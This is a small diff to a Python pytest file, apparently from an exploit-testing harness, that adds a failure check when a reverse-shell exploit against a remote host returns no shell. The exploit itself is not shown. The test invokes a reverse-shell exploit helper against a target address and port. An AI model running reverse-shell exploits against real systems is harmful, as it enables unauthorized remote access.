@@ -15,6 +15,9 @@ tester = pwntest.PwnTest(ip=rhost, port=rport)
 
 def test_reverse_shell():
     shell = tester.run_reverse_shell_exploit(lhost, lport, exploit_code)
+    if not shell:
+        pytest.fail("Failed to get reverse shell")
+        exit()
     shell.sendline(b"echo FOOBAR")
     assert shell.recvline().strip() == b"FOOBAR"
     shell.close()
